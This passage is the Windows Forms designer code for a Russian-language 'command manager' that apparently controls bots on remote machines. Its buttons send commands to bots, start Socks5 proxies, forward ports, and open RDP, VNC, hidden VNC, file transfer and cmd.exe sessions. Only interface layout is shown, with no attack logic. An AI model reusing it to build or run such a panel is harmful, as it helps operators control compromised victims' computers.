			this.btRunVNC.Name = "btRunVNC";
			this.btRunVNC.Size = new System.Drawing.Size(54, 23);
			this.btRunVNC.TabIndex = 28;
			this.btRunVNC.Text = "VNC";
			this.btRunVNC.UseVisualStyleBackColor = true;
			this.btRunVNC.Click += new System.EventHandler(this.btRunVNC_Click);
			// 
			// btOnlineVideo
			// 
			this.btOnlineVideo.Location = new System.Drawing.Point(485, 19);
			this.btOnlineVideo.Name = "btOnlineVideo";
			this.btOnlineVideo.Size = new System.Drawing.Size(94, 23);
			this.btOnlineVideo.TabIndex = 27;
			this.btOnlineVideo.Text = "Онлайн видео";
			this.btOnlineVideo.UseVisualStyleBackColor = true;
			this.btOnlineVideo.Click += new System.EventHandler(this.btOnlineVideo_Click);
			// 
			// tbCmdBot
			// 
			this.tbCmdBot.Location = new System.Drawing.Point(106, 74);
			this.tbCmdBot.Name = "tbCmdBot";
			this.tbCmdBot.Size = new System.Drawing.Size(376, 20);
			this.tbCmdBot.TabIndex = 26;
			// 
			// btCmdBot
			// 
			this.btCmdBot.Location = new System.Drawing.Point(6, 72);
			this.btCmdBot.Name = "btCmdBot";
			this.btCmdBot.Size = new System.Drawing.Size(94, 23);
			this.btCmdBot.TabIndex = 25;
			this.btCmdBot.Text = "Команда боту";
			this.btCmdBot.UseVisualStyleBackColor = true;
			this.btCmdBot.Click += new System.EventHandler(this.btCmdBot_Click);
			// 
			// btStartSocks5
			// 
			this.btStartSocks5.Location = new System.Drawing.Point(126, 19);
			this.btStartSocks5.Name = "btStartSocks5";
			this.btStartSocks5.Size = new System.Drawing.Size(108, 23);
			this.btStartSocks5.TabIndex = 24;
			this.btStartSocks5.Text = "Старт Socks5";
			this.btStartSocks5.UseVisualStyleBackColor = true;
			this.btStartSocks5.Click += new System.EventHandler(this.btStartSocks5_Click);
			// 
			// tbPortForward
			// 
			this.tbPortForward.Location = new System.Drawing.Point(353, 21);
			this.tbPortForward.Name = "tbPortForward";
			this.tbPortForward.Size = new System.Drawing.Size(129, 20);
			this.tbPortForward.TabIndex = 23;
			// 
			// btPortForward
			// 
			this.btPortForward.Location = new System.Drawing.Point(239, 19);
			this.btPortForward.Name = "btPortForward";
			this.btPortForward.Size = new System.Drawing.Size(108, 23);
			this.btPortForward.TabIndex = 22;
			this.btPortForward.Text = "Проброс порта";
			this.btPortForward.UseVisualStyleBackColor = true;
			this.btPortForward.Click += new System.EventHandler(this.btPortForward_Click);
			// 
			// btClosePortForward
			// 
			this.btClosePortForward.Location = new System.Drawing.Point(214, 47);
			this.btClosePortForward.Name = "btClosePortForward";
			this.btClosePortForward.Size = new System.Drawing.Size(252, 23);
			this.btClosePortForward.TabIndex = 21;
			this.btClosePortForward.Text = "Закрыть проброс порта";
			this.btClosePortForward.UseVisualStyleBackColor = true;
			this.btClosePortForward.Click += new System.EventHandler(this.btClosePortForward_Click);
			// 
			// btRunRDP
			// 
			this.btRunRDP.Location = new System.Drawing.Point(6, 19);
			this.btRunRDP.Name = "btRunRDP";
			this.btRunRDP.Size = new System.Drawing.Size(114, 23);
			this.btRunRDP.TabIndex = 20;
			this.btRunRDP.Text = "Запустить RDP";
			this.btRunRDP.UseVisualStyleBackColor = true;
			this.btRunRDP.Click += new System.EventHandler(this.btRunRDP_Click);
			// 
			// menuStrip1
			// 
			this.menuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.сервисToolStripMenuItem});
			this.menuStrip1.Location = new System.Drawing.Point(0, 0);
			this.menuStrip1.Name = "menuStrip1";
			this.menuStrip1.Size = new System.Drawing.Size(1229, 24);
			this.menuStrip1.TabIndex = 1;
			this.menuStrip1.Text = "menuStrip1";
			// 
			// сервисToolStripMenuItem
			// 
			this.сервисToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.itemConfig});
			this.сервисToolStripMenuItem.Name = "сервисToolStripMenuItem";
			this.сервисToolStripMenuItem.Size = new System.Drawing.Size(59, 20);
			this.сервисToolStripMenuItem.Text = "Сервис";
			// 
			// itemConfig
			// 
			this.itemConfig.Name = "itemConfig";
			this.itemConfig.Size = new System.Drawing.Size(134, 22);
			this.itemConfig.Text = "Настройки";
			this.itemConfig.Click += new System.EventHandler(this.itemConfig_Click);
			// 
			// timerUpdateBots
			// 
			this.timerUpdateBots.Interval = 5000;
			this.timerUpdateBots.Tick += new System.EventHandler(this.timerUpdateBots_Tick);
			// 
			// FormMain
			// 
			this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
			this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.ClientSize = new System.Drawing.Size(1229, 703);
			this.Controls.Add(this.tableLayoutPanel1);
			this.Controls.Add(this.menuStrip1);
			this.MainMenuStrip = this.menuStrip1;
			this.Name = "FormMain";
			this.Text = "Командный менеджер";
			this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.FormMain_FormClosed);
			this.Load += new System.EventHandler(this.FormMain_Load);
			this.tableLayoutPanel1.ResumeLayout(false);
			this.tableLayoutPanel2.ResumeLayout(false);
			this.tableLayoutPanel2.PerformLayout();
			((System.ComponentModel.ISupportInitialize)(this.gridBots)).EndInit();
			this.contextMenuBots.ResumeLayout(false);
			this.panel2.ResumeLayout(false);
			this.panel2.PerformLayout();
			this.panel1.ResumeLayout(false);
			this.panel1.PerformLayout();
			this.tableLayoutPanel3.ResumeLayout(false);
			this.tableLayoutPanel3.PerformLayout();
			this.tabsOpenBots.ResumeLayout(false);
			this.tableLayoutPanel4.ResumeLayout(false);
			this.tableLayoutPanel4.PerformLayout();
			this.panel4.ResumeLayout(false);
			this.groupBox1.ResumeLayout(false);
			this.groupBox1.PerformLayout();
			this.menuStrip1.ResumeLayout(false);
			this.menuStrip1.PerformLayout();
			this.ResumeLayout(false);
			this.PerformLayout();

		}

		#endregion

		private System.Windows.Forms.TableLayoutPanel tableLayoutPanel1;
		private System.Windows.Forms.TableLayoutPanel tableLayoutPanel2;
		private System.Windows.Forms.DataGridView gridBots;
		private System.Windows.Forms.Button btRefresh;
		private System.Windows.Forms.Panel panel2;
		private System.Windows.Forms.TextBox tbCountBots;
		private System.Windows.Forms.Label label1;
        private System.Windows.Forms.TableLayoutPanel tableLayoutPanel3;
		private System.Windows.Forms.TableLayoutPanel tableLayoutPanel4;
		private System.Windows.Forms.TextBox tbComment;
		private System.Windows.Forms.Label label2;
		private System.Windows.Forms.Button btComment;
		private System.Windows.Forms.TextBox tbUID;
		private System.Windows.Forms.TextBox tbInfo;
		private System.Windows.Forms.Label label3;
		private System.Windows.Forms.Label label5;
		private System.Windows.Forms.TextBox tbIP;
		private System.Windows.Forms.TextBox tbState;
		private System.Windows.Forms.Label label4;
		private System.Windows.Forms.Panel panel4;
		private System.Windows.Forms.GroupBox groupBox1;
		private System.Windows.Forms.Button btStartSocks5;
		private System.Windows.Forms.TextBox tbPortForward;
		private System.Windows.Forms.Button btPortForward;
		private System.Windows.Forms.Button btClosePortForward;
		private System.Windows.Forms.Button btRunRDP;
		private System.Windows.Forms.TextBox tbCmdBot;
		private System.Windows.Forms.Button btCmdBot;
		private System.Windows.Forms.MenuStrip menuStrip1;
		private System.Windows.Forms.ToolStripMenuItem сервисToolStripMenuItem;
		private System.Windows.Forms.ToolStripMenuItem itemConfig;
		private System.Windows.Forms.TextBox tbLog;
		private System.Windows.Forms.Button btOnlineVideo;
		private System.Windows.Forms.TextBox tbPortVNC;
		private System.Windows.Forms.Label label6;
		private System.Windows.Forms.Button btRunVNC;
		private System.Windows.Forms.Timer timerUpdateBots;
		private System.Windows.Forms.Button btCmdExe;
		private System.Windows.Forms.Button btFileTransfer;
		private System.Windows.Forms.Button btRDPWrap;
		private System.Windows.Forms.TreeView treeGroup;
		private System.Windows.Forms.Panel panel1;
		private System.Windows.Forms.Button btUpdateGroup;
		private System.Windows.Forms.Button btDelGroup;
		private System.Windows.Forms.Button btAddGroup;
		private System.Windows.Forms.TextBox tbNameGroup;
		private System.Windows.Forms.Label label7;
		private System.Windows.Forms.ContextMenuStrip contextMenuBots;
		private System.Windows.Forms.ToolStripMenuItem itemToGroup;
		private System.Windows.Forms.DataGridViewTextBoxColumn Column1;
		private System.Windows.Forms.DataGridViewTextBoxColumn clnUID;
		private System.Windows.Forms.DataGridViewTextBoxColumn clnIP;
		private System.Windows.Forms.DataGridViewTextBoxColumn clnState;
		private System.Windows.Forms.DataGridViewTextBoxColumn clnInfo;
		private System.Windows.Forms.DataGridViewTextBoxColumn clnComment;
        private System.Windows.Forms.Button fullScreenBtn;
        private System.Windows.Forms.TabControl tabsOpenBots;
        private System.Windows.Forms.TabPage tbBots;
        private System.Windows.Forms.Button openVNCbtn;
		private System.Windows.Forms.Button btRunHVNC;
        private System.Windows.Forms.Button btnPlayer;
		private System.Windows.Forms.Button btCmdUser;
		private System.Windows.Forms.Label label8;
		private System.Windows.Forms.TextBox tbSleepMin;
		private System.Windows.Forms.Button btSleep;
		private System.Windows.Forms.Button btOff;
	}
}

